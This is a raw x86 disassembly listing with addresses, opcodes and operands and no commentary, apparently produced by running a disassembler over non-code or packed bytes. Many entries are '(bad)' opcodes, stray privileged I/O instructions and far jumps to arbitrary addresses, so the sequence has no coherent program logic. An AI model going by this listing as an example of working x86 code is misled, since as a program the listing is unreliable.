  42e769:	dec    esp
  42e76a:	push   cs
  42e76b:	xchg   esi,eax
  42e76c:	jl     0x42e7ad
  42e76e:	dec    ebp
  42e76f:	out    0x5a,eax
  42e771:	or     DWORD PTR [edx-0xfca2ca9],esp
  42e777:	xchg   ecx,eax
  42e778:	cdq    
  42e779:	loop   0x42e71b
  42e77b:	dec    esi
  42e77c:	jp     0x42e78c
  42e77e:	mov    ecx,0x83d1e9f0
  42e783:	or     ah,cl
  42e785:	mov    ds:0x9b21737a,al
  42e78a:	aam    0x6a
  42e78c:	mov    edi,0x6ddc740e
  42e791:	xchg   edi,eax
  42e792:	dec    edi
  42e793:	imul   ebp,DWORD PTR [esi],0xfabad22d
  42e799:	mov    dl,0x86
  42e79b:	mov    ecx,0xac6535fc
  42e7a0:	jne    0x42e745
  42e7a2:	add    esp,DWORD PTR [eax-0x52]
  42e7a5:	sub    al,0xac
  42e7a7:	dec    esi
  42e7a8:	ja     0x42e7dd
  42e7aa:	push   edi
  42e7ab:	pusha  
  42e7ac:	in     eax,0x87
  42e7ae:	sbb    al,0xc4
  42e7b0:	push   es
  42e7b1:	outs   dx,BYTE PTR ds:[esi]
  42e7b2:	mov    ebp,0xd4c77f96
  42e7b7:	cmp    eax,esp
  42e7b9:	jbe    0x42e7c3
  42e7bb:	ins    DWORD PTR es:[edi],dx
  42e7bc:	xchg   ebp,eax
  42e7bd:	clc    
  42e7be:	lock popa 
  42e7c0:	adc    al,BYTE PTR [eax]
  42e7c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e7c3:	hlt    
  42e7c4:	imul   eax,DWORD PTR ds:0x2bb6597f,0x3dbc62e9
  42e7ce:	mov    ah,0x89
  42e7d0:	cmp    dh,0x5e
  42e7d3:	popf   
  42e7d4:	sub    al,0x7b
  42e7d6:	in     eax,0xf2
  42e7d8:	sbb    BYTE PTR [eax+0xc],dl
  42e7db:	js     0x42e7f4
  42e7dd:	adc    al,0x8a
  42e7df:	mov    ah,0x52
  42e7e1:	test   eax,0xb202306c
  42e7e6:	addr16 aam 0x21
  42e7e9:	or     eax,0x8b598c47
  42e7ee:	outs   dx,DWORD PTR ds:[esi]
  42e7ef:	outs   dx,DWORD PTR ds:[esi]
  42e7f0:	push   0x2
  42e7f2:	dec    ebp
  42e7f3:	arpl   WORD PTR [ebx+0x77],sp
  42e7f6:	(bad)  
  42e7f7:	jge    0x42e7c0
  42e7f9:	inc    ecx
  42e7fa:	sbb    ebp,0x584b1771
  42e800:	add    esp,DWORD PTR [eax]
  42e802:	lea    esi,[ebp+0x63e09e9d]
  42e808:	out    dx,eax
  42e809:	cmp    BYTE PTR [edx+0x5f1ad168],ch
  42e80f:	pop    ebp
  42e810:	inc    ebp
  42e811:	arpl   WORD PTR es:[eax-0x1c23bd35],si
  42e818:	pop    es
  42e819:	or     edx,ebp
  42e81b:	sub    ah,BYTE PTR [ebx]
  42e81d:	retf   
  42e81e:	imul   esp,DWORD PTR [edx+0x42],0x9fb111a5
  42e825:	add    ebp,ebp
  42e827:	xchg   bh,dl
  42e829:	adc    dh,dl
  42e82b:	mov    BYTE PTR ds:0x934a039b,bh
  42e831:	xchg   esi,eax
  42e832:	jg     0x42e851
  42e834:	mov    ah,0x0
	...
  42e896:	ret    
  42e897:	ja     0x42e8f9
  42e899:	and    al,0xf4
  42e89b:	aaa    
  42e89c:	(bad)  
  42e89d:	div    DWORD PTR [ebp+0x736f13c3]
  42e8a3:	rcr    BYTE PTR [esi+0x1f2b1e7],1
  42e8a9:	add    BYTE PTR [edi],al
  42e8ab:	add    DWORD PTR [eax],eax
  42e8ad:	add    BYTE PTR [edx+esi*2],bl
  42e8b0:	xchg   ebx,eax
  42e8b1:	or     BYTE PTR [ebx],al
  42e8b3:	gs jle 0x42e917
  42e8b6:	sub    bh,BYTE PTR [edi-0x40]
  42e8b9:	mov    edi,0x1e9ca314
  42e8be:	rcr    DWORD PTR [ebx-0x75017ebc],0x13
  42e8c5:	cmp    eax,0x732c553c
  42e8ca:	daa    
  42e8cb:	dec    ebp
  42e8cc:	daa    
  42e8cd:	jl     0x42e877
  42e8cf:	aam    0xb5
  42e8d1:	aam    0x4f
  42e8d3:	jnp    0x42e89e
  42e8d5:	(bad)  
  42e8d6:	mov    al,0xcc
  42e8d8:	adc    dh,al
  42e8da:	jl     0x42e883
  42e8dc:	push   edx
  42e8dd:	and    eax,0xbc4c4b3d
  42e8e2:	jno    0x42e8e9
  42e8e4:	xchg   esp,eax
  42e8e5:	ror    DWORD PTR [edx],1
  42e8e7:	pop    ebx
  42e8e8:	pop    es
  42e8e9:	div    DWORD PTR [edx]
  42e8eb:	pop    es
  42e8ec:	sub    al,0x71
  42e8ee:	push   edx
  42e8ef:	leave  
  42e8f0:	dec    ebp
  42e8f1:	dec    esp
  42e8f2:	stos   BYTE PTR es:[edi],al
  42e8f3:	(bad)  
  42e8f4:	cs std 
  42e8f6:	outs   dx,BYTE PTR ds:[esi]
  42e8f7:	sbb    ah,BYTE PTR [ecx]
  42e8f9:	pop    ecx
  42e8fa:	imul   eax,DWORD PTR [esi+0x20c78478],0xffffff8b
  42e901:	mov    esp,0x2a3ee4d8
  42e906:	xor    eax,0x3d0d0874
  42e90b:	std    
  42e90c:	hlt    
  42e90d:	ins    BYTE PTR es:[edi],dx
  42e90e:	fnsetpm(287 only) 
  42e910:	dec    ecx
  42e911:	dec    eax
  42e912:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e913:	cs cmp ah,bl
  42e916:	iret   
  42e917:	push   0xffffff8a
  42e919:	inc    edi
  42e91a:	iret   
  42e91b:	pusha  
  42e91c:	fs cmp eax,0x37550c5e
  42e922:	lea    esp,[edx+edx*1]
  42e925:	xor    ecx,DWORD PTR [ebx]
  42e927:	call   0x9194:0xabb1b7ad
  42e92e:	in     al,0x35
  42e930:	sti    
  42e931:	call   0x238c:0xdd51f5a6
  42e938:	mov    dl,0xa1
  42e93a:	xor    BYTE PTR [ebx-0x7f],0x39
  42e93e:	sub    eax,DWORD PTR [eax+edx*1+0x1429553e]
  42e945:	sbb    eax,0x758e61b1
  42e94a:	and    al,0x64
  42e94c:	lods   al,BYTE PTR ds:[esi]
  42e94d:	lahf   
  42e94e:	push   esp
  42e94f:	pop    esi
  42e950:	fdivr  QWORD PTR [esi+0x1a9c7bdc]
  42e956:	cmc    
  42e957:	mov    ss,WORD PTR [ecx+ecx*1-0x52]
  42e95b:	sbb    al,0xdc
  42e95d:	lock dec ecx
  42e95f:	cmp    bh,0x35
  42e962:	test   al,0x7
  42e964:	push   0x3f01f050
  42e969:	xchg   ebp,eax
  42e96a:	call   0x224696d6
  42e96f:	fbld   TBYTE PTR [edi+edx*4]
  42e973:	cwde   
  42e974:	adc    BYTE PTR [ebp+ebx*4+0x3d],ah
  42e978:	test   DWORD PTR [esi],esi
  42e97a:	idiv   esi
  42e97c:	leave  
  42e97d:	fsub   QWORD PTR [esi+0x29]
  42e980:	mov    ebx,0x563b44f5
  42e985:	dec    ebx
  42e986:	jmp    0x42e952
  42e988:	jb     0x42e9f0
  42e98a:	or     al,0x9d
  42e98c:	pop    esi
  42e98d:	fcmovu st,st(3)
  42e98f:	das    
  42e990:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e991:	test   eax,0x126ff5c1
  42e996:	sub    BYTE PTR [ebp-0x7dee6595],bh
  42e99c:	push   0xffffffdb
  42e99e:	fist   WORD PTR [edi+esi*2]
  42e9a1:	mov    ds:0xdb07c89d,al
  42e9a6:	(bad)  
  42e9a8:	out    0xa4,eax
  42e9aa:	scas   eax,DWORD PTR es:[edi]
  42e9ab:	or     al,0x92
  42e9ad:	adc    ebp,DWORD PTR [ebx-0x26]
  42e9b0:	mov    ebp,0x5445b857
	...
  42ea15:	add    ch,ah
  42ea17:	mov    edx,0xebdfe392
  42ea1c:	cmc    
  42ea1d:	mov    esi,0xe8a967c2
  42ea22:	icebp  
  42ea23:	ret    
  42ea24:	sbb    edx,DWORD PTR [eax+edi*4]
  42ea27:	repz add DWORD PTR [eax],eax
  42ea2a:	pop    es
  42ea2b:	add    DWORD PTR [eax],eax
  42ea2d:	add    BYTE PTR [ebp-0xa],dl
  42ea30:	fnstcw WORD PTR [esp+esi*4]
  42ea33:	scas   al,BYTE PTR es:[edi]
  42ea34:	(bad)  
  42ea35:	lock fsubr DWORD PTR [edx]
  42ea38:	push   edi
  42ea39:	xchg   ebx,eax
  42ea3a:	call   FWORD PTR [ecx+0x53]
  42ea3d:	je     0x42eaae
  42ea3f:	enter  0xf7cc,0xba
  42ea43:	mov    ebp,0x3fe6b7cd
  42ea48:	mov    eax,0x62e44f00
  42ea4d:	dec    edi
  42ea4e:	fldcw  WORD PTR [ebp+0xb492723]
  42ea54:	lock push edi
  42ea56:	xchg   esp,eax
  42ea57:	enter  0x42b0,0xd9
  42ea5b:	and    BYTE PTR [ebx-0x7e],bh
  42ea5e:	(bad)  
  42ea5f:	lss    eax,FWORD PTR [esi]
  42ea62:	adc    eax,0x1c217083
  42ea67:	or     BYTE PTR [ecx-0x7b],bh
  42ea6a:	cwde   
  42ea6b:	pop    esp
  42ea6c:	adc    ebp,edx
  42ea6e:	ins    DWORD PTR es:[edi],dx
  42ea6f:	inc    edi
  42ea70:	cli    
  42ea71:	stos   DWORD PTR es:[edi],eax
  42ea72:	test   al,0xe5
  42ea74:	mov    edi,0xdb8bbba7
  42ea79:	icebp  
  42ea7a:	dec    esi
  42ea7b:	aas    
  42ea7c:	push   edi
  42ea7d:	frstor [ebp+0x69]
  42ea80:	inc    eax
  42ea81:	stc    
  42ea82:	rol    BYTE PTR [ebx-0x10],0x97
  42ea86:	jp     0x42ea3f
  42ea88:	mov    ds:0xcd90db68,eax
  42ea8d:	xchg   ecx,eax
  42ea8e:	ds jle 0x42eadf
  42ea91:	push   ebp
  42ea92:	arpl   WORD PTR [ebx],si
  42ea94:	mov    ebx,ss
  42ea96:	cmp    DWORD PTR [ebx],0x73b63896
  42ea9c:	jge    0x42ea80
  42ea9e:	cmp    bh,BYTE PTR [edi+esi*4+0x67]
  42eaa2:	and    eax,0x4cf8f9e
  42eaa7:	lods   al,BYTE PTR ds:[esi]
  42eaa8:	jecxz  0x42ea53
  42eaaa:	pop    ds
  42eaab:	cmc    
  42eaac:	daa    
  42eaad:	shl    BYTE PTR [eax+eiz*2],1
  42eab0:	test   BYTE PTR [eax-0xf1fdef],al
  42eab6:	pop    ecx
  42eab7:	(bad)  
  42eab8:	sbb    dh,BYTE PTR [esi+0x30]
  42eabb:	stos   DWORD PTR es:[edi],eax
  42eabc:	loope  0x42eb21
  42eabe:	cmp    eax,0x19987712
  42eac3:	lods   eax,DWORD PTR ds:[esi]
  42eac4:	inc    eax
  42eac5:	jo     0x42ea81
  42eac7:	ret    0xd21e
  42eaca:	cmp    BYTE PTR [ebx+0x30],0x5f
  42eace:	mov    eax,0xaeec62e5
  42ead3:	popf   
  42ead4:	xor    DWORD PTR [ecx],edi
  42ead6:	cwde   
  42ead7:	push   eax
  42ead8:	rcr    BYTE PTR [ecx+0x50],cl
  42eadb:	push   ss
  42eadc:	mov    edx,ecx
  42eade:	add    eax,0x912dbaa0
  42eae3:	dec    eax
  42eae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eae5:	push   cs
  42eae6:	and    eax,0xea477156
  42eaeb:	cli    
  42eaec:	push   ebx
  42eaed:	mov    edx,0x6ee260b6
  42eaf2:	xor    al,0x20
  42eaf4:	push   0x41bc5dfd
  42eaf9:	adc    DWORD PTR [edi],ebp
  42eafb:	pop    eax
  42eafc:	stos   DWORD PTR es:[edi],eax
  42eafd:	sbb    dl,BYTE PTR [esi-0x46e22e35]
  42eb03:	xchg   ebp,eax
  42eb04:	sbb    ebx,ecx
  42eb06:	add    eax,DWORD PTR ds:0xaed40654
  42eb0c:	mul    DWORD PTR [ecx-0xd]
  42eb0f:	and    BYTE PTR [edx-0x1a393237],cl
  42eb15:	or     ebp,edx
  42eb17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb19:	repnz scas al,BYTE PTR es:[edi]
  42eb1b:	fadd   st,st(4)
  42eb1d:	xor    DWORD PTR [edi],edx
  42eb1f:	adc    ebx,DWORD PTR [ecx+edi*4]
  42eb22:	jmp    0x42eb57
  42eb24:	(bad)  
  42eb25:	and    al,0x30
  42eb27:	pop    es
  42eb28:	adc    al,0x32
  42eb2a:	jmp    FWORD PTR [ebx+0x35]
  42eb2d:	cmp    al,BYTE PTR [esi-0x73a7299b]
  42eb33:	xchg   edi,eax
  42eb34:	repz add BYTE PTR [eax],al
	...
  42eb93:	add    BYTE PTR [eax],al
  42eb95:	add    BYTE PTR [esi+0x41],bh
  42eb98:	jne    0xfc41badd
  42eb9e:	add    DWORD PTR [edi+0x2c195ada],ebp
  42eba4:	aad    0x62
  42eba6:	mov    edi,0x70001f4
  42ebab:	add    DWORD PTR [eax],eax
  42ebad:	add    BYTE PTR [ecx],cl
  42ebaf:	cld    
  42ebb0:	int3   
  42ebb1:	mov    esp,0x9fbd2330
  42ebb6:	jmp    0x42eb4f
  42ebb8:	pop    ecx
  42ebb9:	cmp    al,0x84
  42ebbb:	push   ss
  42ebbc:	dec    esi
  42ebbd:	hlt    
  42ebbe:	mov    ebx,esp
  42ebc0:	cmp    al,0x2f
  42ebc2:	mov    cl,0x47
  42ebc4:	dec    eax
  42ebc5:	into   
  42ebc6:	jns    0x42eba4
  42ebc8:	(bad)  [esp+ecx*2]
  42ebcb:	pusha  
  42ebcc:	hlt    
  42ebcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ebce:	inc    esi
  42ebcf:	cwde   
  42ebd0:	adc    cl,BYTE PTR [ebp+0x791b3605]
  42ebd6:	gs stc 
  42ebd8:	out    dx,eax
  42ebd9:	stos   BYTE PTR es:[edi],al
  42ebda:	mov    bh,0xc5
  42ebdc:	pop    esi
  42ebdd:	rcl    DWORD PTR [edi-0xf],1
  42ebe0:	pop    ebx
  42ebe1:	mov    ebx,0xb5793dbd
  42ebe6:	mov    edi,0x279ffec7
  42ebeb:	pop    esp
  42ebec:	loopne 0x42eba0
  42ebee:	mov    eax,ds:0x7d77d52e
  42ebf3:	sub    DWORD PTR [ecx-0x34],ebx
  42ebf6:	fcom   QWORD PTR [bp+0x6d]
  42ebfa:	in     al,0x16
  42ebfc:	xor    al,BYTE PTR [esi]
  42ebfe:	jns    0x42ebb3
  42ec00:	pop    ds
  42ec01:	sub    eax,0xa7d52397
  42ec06:	cmp    BYTE PTR [ebx],cl
  42ec08:	outs   dx,BYTE PTR ds:[esi]
  42ec09:	add    eax,0x3340e467
  42ec0e:	nop
  42ec0f:	repz std 
  42ec11:	push   edx
  42ec12:	xchg   ebp,eax
  42ec13:	adc    BYTE PTR [ecx-0x6e],dl
  42ec16:	pop    edi
  42ec17:	inc    esp
  42ec18:	jae    0x42ec67
  42ec1a:	popf   
  42ec1b:	popf   
  42ec1c:	je     0x42ec10
  42ec1e:	loopne 0x42ec5c
  42ec20:	inc    ebx
  42ec21:	jge    0x42eba3
  42ec23:	xchg   ebp,eax
  42ec24:	mov    eax,ds:0x3e678c72
  42ec29:	loop   0x42ebfc
  42ec2b:	jecxz  0x42ec57
  42ec2d:	push   ds
  42ec2e:	into   
  42ec2f:	push   es
  42ec30:	retf   
  42ec31:	inc    ebp
  42ec32:	xchg   ebx,eax
  42ec33:	push   0xa
  42ec35:	inc    ecx
  42ec36:	jge    0x42ec14
  42ec38:	jmp    0x9003:0xd18eb1d0
  42ec3f:	or     DWORD PTR ds:0xf362a90c,0x39
  42ec46:	xchg   edx,eax
  42ec47:	mov    ss,WORD PTR [ebx+0x40329293]
  42ec4d:	xchg   DWORD PTR [ebx],esp
  42ec4f:	leave  
  42ec50:	mov    ds:0x1c0d8a5a,al
  42ec55:	pop    esp
  42ec56:	ret    
  42ec57:	(bad)  
  42ec58:	(bad)  
  42ec59:	xor    edi,esi
  42ec5b:	sbb    al,0xf8
  42ec5d:	xchg   ebx,eax
  42ec5e:	dec    ebp
  42ec5f:	mov    edi,0x1f9bf1a3
  42ec64:	test   BYTE PTR [eax-0x35],bl
  42ec67:	mov    cl,0xd1
  42ec69:	sbb    BYTE PTR [ecx],dl
  42ec6b:	jecxz  0x42ec45
  42ec6d:	xchg   ecx,eax
  42ec6e:	jae    0x42ec8d
  42ec70:	add    edx,esp
  42ec72:	out    dx,al
  42ec73:	std    
  42ec74:	push   ebx
  42ec75:	xchg   esi,eax
  42ec76:	jmp    0x158d59ce
  42ec7b:	mov    DWORD PTR [esi+0x2d],0x1ddc817f
  42ec82:	dec    ebx
  42ec83:	dec    edi
  42ec84:	lea    ecx,[edx]
  42ec86:	push   ebp
  42ec87:	and    al,0x4e
  42ec89:	and    DWORD PTR [eax+0x2f],ecx
  42ec8c:	jo     0x42ed09
  42ec8e:	push   edi
  42ec8f:	js     0x42ec78
  42ec91:	inc    edi
  42ec92:	mov    al,ds:0xf8fd4ca5
  42ec97:	mov    ebx,0x5b20ffef
  42ec9c:	cmp    edi,DWORD PTR [ecx+0x6f293685]
  42eca2:	or     eax,0x1bbf168
  42eca7:	es idiv bh
  42ecaa:	data16 mov ds:0xb6f03ff,al
  42ecb0:	leave  
  42ecb1:	adc    esi,0xaa4b
	...
  42ed13:	add    BYTE PTR [eax],al
  42ed15:	add    BYTE PTR [edx],ch
  42ed17:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed1d:	idiv   BYTE PTR [esi-0x40f5e81]
  42ed23:	sbb    ch,bl
  42ed25:	add    esi,0x70001f5
  42ed2b:	add    DWORD PTR [eax],eax
  42ed2d:	add    BYTE PTR [ebx],cl
  42ed2f:	outs   dx,DWORD PTR ds:[esi]
  42ed30:	rcr    edi,cl
  42ed32:	adc    eax,0x83aff7c3
  42ed37:	(bad)  
  42ed38:	call   0xf3eb:0x695b5296
  42ed3f:	push   edx
  42ed40:	cwde   
  42ed41:	jno    0x42ed87
  42ed43:	out    0x5,al
  42ed45:	(bad)  
  42ed47:	scas   al,BYTE PTR es:[edi]
  42ed48:	add    DWORD PTR [edx-0x6a],eax
  42ed4b:	cmc    
  42ed4c:	push   ds
  42ed4d:	sub    al,0xd8
  42ed4f:	jmp    0xb70f1e60
  42ed54:	mov    ah,cl
  42ed56:	data16 test BYTE PTR [edi],0xba
  42ed5a:	inc    ebx
  42ed5b:	das    
  42ed5c:	and    ebp,DWORD PTR [ebx]
  42ed5e:	jns    0x42ed84
  42ed60:	cld    
  42ed61:	(bad)  
  42ed63:	enter  0x60e3,0x14
  42ed67:	mul    DWORD PTR [edi+0x5e3c2aec]
  42ed6d:	retf   
  42ed6e:	arpl   WORD PTR [eax+0x7e49f153],cx
  42ed74:	mov    dh,0x7b
  42ed76:	jnp    0x42ed65
  42ed78:	iret   
  42ed79:	mov    DWORD PTR [ecx],0xf845321a
  42ed7f:	fist   WORD PTR [edx]
  42ed81:	jmp    0xcf46:0xaa955c70
  42ed88:	or     DWORD PTR gs:[edi+0x4dc9c67e],0x5f98a675
  42ed93:	push   ebp
  42ed94:	pop    ds
  42ed95:	mov    dh,0x85
  42ed97:	pop    es
  42ed98:	push   ss
  42ed99:	ja     0x42ed56
  42ed9b:	inc    eax
  42ed9c:	pop    ss
  42ed9d:	mov    ebp,0xfd59963d
  42eda2:	jmp    0x42ed46
  42eda4:	rol    BYTE PTR [ecx],1
  42eda6:	in     eax,0x6b
  42eda8:	add    DWORD PTR [ebx],0xffffffbf
  42edab:	pop    ebp
  42edac:	aaa    
  42edad:	adc    eax,0xad0965d5
  42edb2:	mov    WORD PTR [ecx],es
  42edb4:	sub    DWORD PTR [edx],esp
  42edb6:	arpl   WORD PTR [eax+0x48],dx
  42edb9:	mov    al,0xa9
  42edbb:	jmp    0xd8f9:0x28d5a8a6
  42edc2:	mov    ebp,0x58bbb97d
  42edc7:	xchg   esp,eax
  42edc8:	adc    al,0x21
  42edca:	sbb    ebx,DWORD PTR [edi]
  42edcc:	int    0x64
  42edce:	xchg   esp,eax
  42edcf:	lea    edx,[esi]
  42edd1:	push   eax
  42edd2:	in     eax,0xf3
  42edd4:	and    ebp,edx
  42edd6:	push   edi
  42edd7:	adc    DWORD PTR [esp+ebx*2+0x6c],ebx
  42eddb:	les    ecx,FWORD PTR [edi-0x6cbdf0ad]
  42ede1:	inc    esp
  42ede2:	push   ebp
  42ede3:	fisttp WORD PTR [ebp-0xe]
  42ede6:	outs   dx,DWORD PTR ds:[esi]
  42ede7:	repz clc 
  42ede9:	inc    eax
  42edea:	sbb    eax,0x9162c897
  42edef:	in     al,dx
  42edf0:	jns    0x42ede1
  42edf2:	push   ss
  42edf3:	or     eax,0xcc4825ae
  42edf8:	cwde   
  42edf9:	jp     0x42edf4
  42edfb:	ja     0x42ed9f
  42edfd:	inc    ebx
  42edfe:	pop    ecx
  42edff:	nop
  42ee00:	add    al,0xa7
  42ee02:	mov    ebx,0x9189edf9
  42ee07:	xchg   esi,eax
  42ee08:	test   eax,0xf27a52d9
  42ee0d:	sti    
  42ee0e:	xchg   edx,eax
  42ee0f:	mov    eax,?
  42ee11:	mov    esp,0xed3b500
  42ee16:	sar    BYTE PTR [esi-0x10],0x6
  42ee1a:	add    DWORD PTR [esi*2+0x5bdd4a92],eax
  42ee21:	and    eax,0xdbf8b9d6
  42ee26:	and    al,0xc5
  42ee28:	xchg   DWORD PTR [esi+0x297ea3c3],ebp
  42ee2e:	jae    0x42edc6
  42ee30:	pop    ds
  42ee31:	xchg   cl,bl
  42ee33:	sbb    bl,bh
	...
  42ee95:	add    bl,al
  42ee97:	add    cl,BYTE PTR [eax]
  42ee99:	xor    eax,0xf6ff3fc9
  42ee9e:	sub    DWORD PTR ds:0xe8a9f479,edi
  42eea4:	mov    BYTE PTR [eax],0xcd
  42eea7:	test   BYTE PTR [ecx],0x0
  42eeaa:	pop    es
  42eeab:	add    DWORD PTR [eax],eax
  42eead:	add    bl,cl
  42eeaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eeb0:	icebp  
  42eeb1:	mov    BYTE PTR [ecx+eax*2-0x6f566a87],0x90
  42eeb9:	mov    ebp,0x7f85f691
  42eebe:	rcr    BYTE PTR [edi-0x2352b15d],0xca
  42eec5:	(bad)  
  42eec6:	(bad)  [esi-0x16]
  42eec9:	cmp    edx,DWORD PTR [edi-0x260bceaf]
  42eecf:	jno    0x42eeec
  42eed1:	mov    edi,0x1d93e9b4
  42eed6:	mov    ss,WORD PTR [bp+di-0x53]
  42eeda:	xor    edx,edi
  42eedc:	aam    0x1b
  42eede:	lock pusha 
  42eee0:	pop    edx
  42eee1:	icebp  
  42eee2:	mov    bl,0xaa
  42eee4:	push   es
  42eee5:	icebp  
  42eee6:	das    
  42eee7:	and    DWORD PTR [eax],ebx
  42eee9:	xor    al,0x6b
  42eeeb:	(bad)  
  42eeec:	ja     0x42ef0b
  42eeee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eeef:	push   0xf24612f6
  42eef4:	(bad)  
  42eef5:	jp     0x42ee97
  42eef7:	xchg   ecx,eax
  42eef8:	aaa    
  42eef9:	inc    esp
  42eefa:	sub    al,0x16
  42eefc:	jmp    0x8388b76e
  42ef01:	adc    eax,0xcbebd2ec
  42ef06:	call   DWORD PTR [esi-0x72]
  42ef09:	jo     0x42eec7
  42ef0b:	cdq    
  42ef0c:	out    0x1b,eax
  42ef0e:	fadd   st,st(6)
  42ef10:	fs inc eax
  42ef12:	lea    edi,[eax-0x30]
  42ef15:	jmp    0xb5ba829d
  42ef1a:	inc    eax
  42ef1b:	(bad)  
  42ef1c:	sahf   
  42ef1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ef1e:	lea    ebx,[esi+edx*1]
  42ef21:	(bad)  
  42ef22:	aas    
  42ef23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ef24:	push   es
  42ef25:	dec    edi
  42ef26:	popf   
  42ef27:	adc    al,0xb4
  42ef29:	jge    0x42eec5
  42ef2b:	mov    dh,0x30
  42ef2d:	dec    ebp
  42ef2e:	mov    dh,0x4d
  42ef30:	cli    
  42ef31:	sbb    DWORD PTR [edx+0x6c],esp
  42ef34:	shr    DWORD PTR [ebp+0x3cb24c3f],0x62
  42ef3b:	jne    0x42ef4a
  42ef3d:	icebp  
  42ef3e:	pop    ecx
  42ef3f:	rcl    DWORD PTR [edi-0x2c957d42],0x9b
  42ef46:	xchg   ebx,eax
  42ef47:	sub    ah,BYTE PTR [ecx+eiz*4]
  42ef4a:	pop    ebp
  42ef4b:	inc    edi
  42ef4c:	adc    DWORD PTR ds:0xd208c08a,0xffffffc7
  42ef54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ef55:	sbb    al,0x3b
  42ef57:	dec    ecx
  42ef58:	sub    ecx,DWORD PTR [edi]
  42ef5a:	or     al,0x42
  42ef5c:	pop    ebx
  42ef5d:	lods   eax,DWORD PTR ds:[esi]
  42ef5e:	not    cl
  42ef60:	pop    ebx
  42ef61:	imul   eax,DWORD PTR [edi+0x53],0x33
  42ef65:	jge    0x42ef14
  42ef67:	xchg   BYTE PTR [si-0x10],bl
  42ef6b:	pop    ss
  42ef6c:	imul   ecx,DWORD PTR [eax-0x5403a250],0x40540822
  42ef76:	sbb    BYTE PTR [ebp+0x578d5dc1],ch
  42ef7c:	and    eax,0x27cf5db4
  42ef81:	sub    ah,bl
  42ef83:	or     eax,0xc882a5d7
  42ef88:	pop    esp
  42ef89:	(bad)  
  42ef8a:	adc    eax,0xdffa782f
  42ef8f:	(bad)  [ecx]
  42ef91:	or     BYTE PTR [ecx-0x52],ch
  42ef94:	(bad)  
  42ef95:	cmp    bh,BYTE PTR [eax]
  42ef97:	cmp    eax,0xfb929999
  42ef9c:	jne    0x42efdd
  42ef9e:	jmp    0xbfffdaa9
  42efa3:	outs   dx,DWORD PTR ds:[esi]
  42efa4:	mov    BYTE PTR [edi],0x6d
  42efa7:	lods   al,BYTE PTR ds:[esi]
  42efa8:	push   edx
  42efa9:	mov    bl,0x44
  42efab:	cmp    al,BYTE PTR es:[ebp-0x1c]
  42efaf:	dec    ebx
  42efb0:	lods   al,BYTE PTR ds:[esi]
  42efb1:	push   cs
  42efb2:	sub    ebx,DWORD PTR [ecx+0x35]
	...
  42f014:	add    BYTE PTR [eax],al
  42f016:	adc    bh,BYTE PTR [esi]
  42f018:	int    0xe5
  42f01a:	in     eax,dx
  42f01b:	idiv   DWORD PTR [edx]
  42f01d:	call   edx
  42f01f:	sbb    eax,0xdf45d516
  42f024:	adc    DWORD PTR [edx+0x1f7d4],0x7
  42f02b:	add    DWORD PTR [eax],eax
  42f02d:	add    dh,al
  42f02f:	ja     0x42f023
  42f031:	(bad)  
  42f032:	push   0x2ffa71b4
  42f037:	out    dx,eax
  42f038:	mov    dl,BYTE PTR [bp-0x4cbc]
  42f03d:	cmp    edi,DWORD PTR [ebx]
  42f03f:	dec    edi
  42f040:	(bad)  
  42f041:	es data16 xor al,0xdd
  42f045:	ds rcr dh,cl
  42f048:	mov    dl,0x5f
  42f04a:	adc    esp,DWORD PTR ds:0xbbeab02d
  42f050:	inc    eax
  42f051:	fs ja  0x42f0c5
  42f054:	ins    BYTE PTR es:[edi],dx
  42f055:	retf   
  42f056:	xchg   esp,eax
  42f057:	add    al,BYTE PTR [edi-0x72]
  42f05a:	arpl   WORD PTR [ecx+eax*2-0x4b],bp
  42f05e:	repz addr16 inc edx
  42f061:	out    0xef,eax
  42f063:	inc    edi
  42f064:	jnp    0x42f077
  42f066:	imul   ebp,DWORD PTR [eax],0xffffffcc
  42f069:	test   DWORD PTR [edx-0x76],esp
  42f06c:	(bad)  
  42f06d:	imul   BYTE PTR [edi-0x21]
  42f070:	test   eax,0xb460ff72
  42f075:	mov    dh,0x22
  42f077:	push   0xffffffc2
  42f079:	inc    esi
  42f07a:	dec    edx
  42f07b:	mov    BYTE PTR [ecx],0x1
  42f07e:	mov    ds:0xa4f43294,eax
  42f083:	or     dh,BYTE PTR [edi+0x67281f97]
  42f089:	imul   eax,DWORD PTR [edx+edx*8+0x46],0xd4914924
  42f091:	dec    esi
  42f092:	test   al,0xa3
  42f094:	imul   edi,DWORD PTR [edx],0xac66780a
  42f09a:	and    DWORD PTR [edx+ebx*4+0x3],edx
  42f09e:	xchg   edx,eax
  42f09f:	pop    ebx
  42f0a0:	push   edx
  42f0a1:	sbb    ah,ah
  42f0a3:	ret    
  42f0a4:	nop
  42f0a5:	mov    ch,0x9d
  42f0a7:	pop    ebx
  42f0a8:	div    BYTE PTR [esi+0x13]
  42f0ab:	in     al,dx
  42f0ac:	adc    eax,DWORD PTR [esi-0x25]
  42f0af:	pop    ebp
  42f0b0:	xchg   ebx,eax
  42f0b1:	and    bh,BYTE PTR ds:0x9225b957
  42f0b7:	gs cli 
  42f0b9:	cmp    al,0x52
  42f0bb:	aad    0xd3
  42f0bd:	sub    dl,BYTE PTR [ebx-0x7a]
  42f0c0:	adc    al,0x21
  42f0c2:	dec    eax
  42f0c3:	arpl   WORD PTR ds:0x34c5b553,di
  42f0c9:	repnz dec ecx
  42f0cb:	mov    ecx,0x1f445454
  42f0d0:	sub    al,0x86
  42f0d2:	hlt    
  42f0d3:	arpl   WORD PTR [ebp+0x73],bp
  42f0d6:	push   eax
  42f0d7:	push   ecx
  42f0d8:	or     DWORD PTR [edi-0x5],edi
  42f0db:	lods   al,BYTE PTR ds:[esi]
  42f0dc:	jbe    0x42f0b8
  42f0de:	(bad)  
  42f0df:	jbe    0x42f0b0
